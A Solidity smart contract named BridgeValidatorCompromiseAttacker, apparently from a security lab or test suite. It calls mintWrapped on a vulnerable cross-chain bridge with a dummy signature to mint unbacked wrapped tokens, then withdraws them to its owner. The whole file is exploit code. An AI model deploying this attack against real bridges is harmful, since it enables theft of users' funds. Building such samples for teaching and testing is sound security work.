// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "../../interfaces/IERC20Minimal.sol";

interface IVulnerableBridge {
    function mintWrapped(bytes calldata message, bytes calldata signature) external;
    function release(bytes calldata message, bytes calldata signature) external;
    function wrappedSupply(address) external view returns (uint256);
}

contract BridgeValidatorCompromiseAttacker {
    address public owner;
    uint256 public totalTokensMinted;

    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner");
        _;
    }

    constructor() {
        owner = msg.sender;
    }

    function exploitSingleValidator(address bridge, address token, uint256 amount, address to)
        external
        onlyOwner
    {
        bytes memory message = abi.encode(token, amount, to, block.timestamp);
        bytes memory dummySig = abi.encodePacked("sig");
        IVulnerableBridge(bridge).mintWrapped(message, dummySig);
        totalTokensMinted += amount;
    }

    function getProfits() external view returns (uint256) {
        return totalTokensMinted;
    }

    function withdrawToken(address token, uint256 amount) external onlyOwner {
        IERC20Minimal(token).transfer(owner, amount);
    }
}
